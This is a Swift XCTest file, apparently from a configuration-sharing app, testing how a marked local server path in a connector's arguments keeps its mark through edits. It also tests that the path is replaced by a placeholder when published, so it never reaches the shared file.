    func testSavingMovesAPathMarkWithItsRow() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let file = try publishTeam(rig, args: [serverPath, "--quiet"])

        var editor = rig.editor("svc", in: "Team")
        editor.args.insert(ArgRow(value: "--inspect"), at: 0)
        XCTAssertTrue(editor.save())
        XCTAssertEqual(marks(rig), mark(at: 1, value: serverPath), "an argument inserted above")
        XCTAssertEqual(try publishedArgs(file), ["--inspect", "${CC_NEEDS:server_path}", "--quiet"],
                       "the neighbour that slid into the old position travels as written, the path does not")

        editor = rig.editor("svc", in: "Team")
        editor.args.remove(at: 0)
        XCTAssertTrue(editor.save())
        XCTAssertEqual(marks(rig), mark(at: 0, value: serverPath), "one removed above")

        editor = rig.editor("svc", in: "Team")
        editor.args.swapAt(0, 1)
        XCTAssertTrue(editor.save())
        XCTAssertEqual(marks(rig), mark(at: 1, value: serverPath), "reordered")
        XCTAssertEqual(try publishedArgs(file), ["--quiet", "${CC_NEEDS:server_path}"])
        XCTAssertNil(rig.state.publishError)
        XCTAssertFalse(try jsonFile(file, contains: serverPath))
    }

    func testEditingTheMarkedPathInPlaceKeepsItMarked() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let file = try publishTeam(rig, args: [serverPath])
        let editor = rig.editor("svc", in: "Team")
        let corrected = "/Users/d/v2/server.js"
        editor.args[0].value = corrected
        XCTAssertTrue(editor.save())
        XCTAssertEqual(marks(rig), mark(at: 0, value: corrected), "still the marked row; the record learns its new text")
        XCTAssertEqual(try publishedArgs(file), ["${CC_NEEDS:server_path}"])
        XCTAssertNil(rig.state.publishError)
        XCTAssertFalse(try jsonFile(file, contains: corrected))
    }

    func testDeletingTheMarkedRowDropsItsMark() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let file = try publishTeam(rig, args: ["--quiet", serverPath])
        let editor = rig.editor("svc", in: "Team")
        editor.args.remove(at: 1)
        XCTAssertTrue(editor.save())
        XCTAssertNil(marks(rig), "nothing is left for it to mark")
        XCTAssertNil(rig.state.publishError)
        XCTAssertEqual(try publishedArgs(file), ["--quiet"])
    }

    func testDeletingTheMarkedRowAndTypingThePathBackKeepsItMarked() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let file = try publishTeam(rig, args: [serverPath, "--quiet"])
        let editor = rig.editor("svc", in: "Team")
        editor.args.remove(at: 0)
        editor.args.append(ArgRow(value: serverPath))
        XCTAssertTrue(editor.save())
        XCTAssertNil(rig.state.publishError)
        XCTAssertEqual(try publishedArgs(file), ["--quiet", "${CC_NEEDS:server_path}"],
                       "the same path typed back is still the marked path")
        XCTAssertFalse(try jsonFile(file, contains: serverPath))
        XCTAssertEqual(marks(rig), mark(at: 0, value: serverPath), "left for publishing to place by value")
    }

    func testMovingTheMarkedPathIntoTheCommandKeepsItBack() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let file = try publishTeam(rig, args: [serverPath, "--quiet"])
        let before = try Data(contentsOf: file)
        let editor = rig.editor("svc", in: "Team")
        editor.command = serverPath
        editor.args.remove(at: 0)
        XCTAssertTrue(editor.save())
        XCTAssertEqual(marks(rig), mark(at: 0, value: serverPath), "the path is still in the save, so the mark stays")
        XCTAssertEqual(rig.state.publishError?.message, AppState.pathMarkMovedError("svc"))
        XCTAssertEqual(rig.state.publishError?.kind, .blockedForReview)
        XCTAssertEqual(try Data(contentsOf: file), before)
        XCTAssertFalse(try jsonFile(file, contains: serverPath))
    }

    func testACopyOfTheMarkedPathWaitsUntilTheSheetTicksBoth() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let file = try publishTeam(rig, args: [serverPath, "--quiet"])
        let before = try Data(contentsOf: file)
        let editor = rig.editor("svc", in: "Team")
        editor.args.append(ArgRow(value: serverPath))
        XCTAssertTrue(editor.save())
        XCTAssertEqual(rig.state.publishError?.message, AppState.keptPathCarriedError("svc", FieldName.argument(3)))
        XCTAssertEqual(try Data(contentsOf: file), before, "the copy is not sent as written")

        // Publish… ticks every row holding the marked path, under the mark's name and hint.
        let sheet = PublishModel(state: rig.state, collection: "Team")
        let copies = sheet.pathRows.filter { $0.connector == "svc" && $0.value == serverPath }
        XCTAssertEqual(copies.map(\.marked), [true, true])
        XCTAssertEqual(copies.map(\.name), ["server_path", "server_path"])
        XCTAssertEqual(copies.map(\.hint), ["your clone", "your clone"])
        XCTAssertNil(sheet.publish())
        XCTAssertNil(rig.state.publishError)
        XCTAssertEqual(try publishedArgs(file), ["${CC_NEEDS:server_path}", "--quiet", "${CC_NEEDS:server_path}"])
        XCTAssertFalse(try jsonFile(file, contains: serverPath))
    }

    func testARenameCarriesTheMarksToTheNewName() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let file = try publishTeam(rig, args: [serverPath])
        let editor = rig.editor("svc", in: "Team")
        editor.name = "server"
        editor.args.insert(ArgRow(value: "--quiet"), at: 0)
        XCTAssertTrue(editor.save())
        XCTAssertNil(marks(rig))
        XCTAssertEqual(marks(rig, "server"), mark(at: 1, value: serverPath))
        XCTAssertEqual(try publishedArgs(file, "server"), ["--quiet", "${CC_NEEDS:server_path}"])
        XCTAssertNil(rig.state.publishError)
    }

    func testAJSONEditLeavesTheMarksToBePlacedByTheirValue() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let file = try publishTeam(rig, args: [serverPath, "--quiet"])

        // Reordered in the JSON view: the rows come back matched by position, which is a guess,
        // so the record is left as it is and publishing finds the path by what it says.
        let editor = rig.editor("svc", in: "Team")
        editor.requestView(.json)
        editor.jsonText = rig.local("node", ["--quiet", serverPath]).editorText()
        editor.requestView(.form)
        XCTAssertEqual(editor.view, .form)
        XCTAssertTrue(editor.save())
        XCTAssertEqual(marks(rig), mark(at: 0, value: serverPath), "not re-keyed on a guess")
        XCTAssertEqual(try publishedArgs(file), ["--quiet", "${CC_NEEDS:server_path}"])

        // Changed in the JSON view and saved from there: nothing says which argument is the
        // marked one now, so no document is written until the author marks it again.
        let before = try Data(contentsOf: file)
        let again = rig.editor("svc", in: "Team")
        again.requestView(.json)
        again.jsonText = rig.local("node", ["--quiet", "/Users/d/v2/server.js"]).editorText()
        XCTAssertTrue(again.save())
        XCTAssertEqual(rig.state.publishError?.message, AppState.pathMarkMovedError("svc"))
        XCTAssertEqual(try Data(contentsOf: file), before)
    }

    func testPropagateMovesATwinsMarksToo() throws {
        let rig = EditorRig()
        defer { rig.dispose() }
        let state = rig.state
        try publishTeam(rig, args: [serverPath])
        XCTAssertNil(state.createCollection(named: "Mirror"))   // a copy of Team, and now active
        try rig.h.publish(state, "Mirror", intent: PublishIntent(
            shareValues: [:], pathMarks: ["svc": mark(at: 0, value: serverPath)], hints: [:]), folder: "share2")

        let editor = rig.editor("svc", in: "Team")
        XCTAssertEqual(editor.propagateTargets, ["Mirror"])
        editor.propagate = true
        editor.args.insert(ArgRow(value: "--quiet"), at: 0)
        XCTAssertTrue(editor.save())
        XCTAssertEqual(marks(rig), mark(at: 1, value: serverPath))
        XCTAssertEqual(marks(rig, in: "Mirror"), mark(at: 1, value: serverPath),
                       "the twin held the same arguments, so its marks follow the same rows")
        XCTAssertNil(state.publishError)
    }
}
